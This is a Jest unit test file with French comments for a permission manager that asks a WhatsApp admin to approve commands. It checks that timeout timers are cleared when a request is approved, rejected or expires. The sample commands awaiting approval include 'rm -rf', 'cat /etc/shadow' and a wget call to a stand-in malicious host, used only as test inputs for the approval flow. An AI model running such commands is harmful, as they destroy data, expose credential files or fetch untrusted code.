// tests/unit/core/permissionManagerTimers.test.ts
// Issue #23 — les timers de timeout (Hub et In-Band) doivent être trackés dans
// PendingRequest.timers et purgés par _cleanup dès la résolution : aucune
// accumulation de handles setTimeout vivants après une approbation.
import { describe, it, beforeEach, jest, expect } from '@jest/globals';
import type { PermissionManager as PermissionManagerType } from '../../../core/security/PermissionManager.js';

jest.unstable_mockModule('../../../core/transport/TransportManager.js', () => ({
  transportManager: {
    sendText: jest.fn(async () => ({})),
  },
}));

jest.unstable_mockModule('../../../services/adminService.js', () => ({
  adminService: {
    isSuperUser: jest.fn(async () => true),
    getOwnerJid: jest.fn(async () => null),
    listAdmins: jest.fn(async () => []),
  },
}));

const PMModule = await import('../../../core/security/PermissionManager.js');
const { PermissionManager } = PMModule;

describe('PermissionManager — purge des timers de requête (#23)', () => {
  let pm: PermissionManagerType;

  beforeEach(() => {
    jest.clearAllMocks();
    jest.useFakeTimers();
    pm = new PermissionManager();
  });

  afterEach(() => {
    jest.clearAllTimers();
    jest.useRealTimers();
  });

  it('clearTimeout le timer In-Band à l approbation (aucun handle résiduel)', async () => {
    const clearTimeoutSpy = jest.spyOn(globalThis, 'clearTimeout');

    const requestPromise = pm.askPermission(
      'chat-1',
      'rm -rf /tmp/anything',
      'whatsapp',
      'admin-1@s.whatsapp.net',
    );

    await jest.advanceTimersByTimeAsync(0);
    expect(jest.getTimerCount()).toBe(1); // le timer In-Band est armé

    const handled = pm.handleUserResponse('oui', 'chat-1', 'admin-1@s.whatsapp.net');
    expect(handled).toBe(true);

    expect(clearTimeoutSpy).toHaveBeenCalled();
    expect(jest.getTimerCount()).toBe(0); // purgé avant expiry
    await expect(requestPromise).resolves.toEqual({ granted: true });
    expect(pm.pendingCount).toBe(0);

    clearTimeoutSpy.mockRestore();
  });

  it('clearTimeout aussi sur un rejet explicite', async () => {
    const requestPromise = pm.askPermission(
      'chat-2',
      'cat /etc/shadow',
      'whatsapp',
      'admin-2@s.whatsapp.net',
    );

    await jest.advanceTimersByTimeAsync(0);
    expect(jest.getTimerCount()).toBe(1);

    expect(pm.handleUserResponse('non', 'chat-2', 'admin-2@s.whatsapp.net')).toBe(true);
    expect(jest.getTimerCount()).toBe(0);
    await expect(requestPromise).resolves.toEqual({ granted: false });
    expect(pm.pendingCount).toBe(0);
  });

  it('le timer In-Band résout et se purge de lui-même au bout de INBAND_TIMEOUT_MS', async () => {
    const requestPromise = pm.askPermission(
      'chat-3',
      'wget http://malicious.example',
      'whatsapp',
      'admin-3@s.whatsapp.net',
    );

    await jest.advanceTimersByTimeAsync(0);
    expect(jest.getTimerCount()).toBe(1);

    await jest.advanceTimersByTimeAsync(15 * 60 * 1000 + 1);
    await expect(requestPromise).resolves.toEqual({
      granted: false,
      feedback: 'The administrator did not respond in time (Timeout).',
    });
    expect(pm.pendingCount).toBe(0);
  });
});
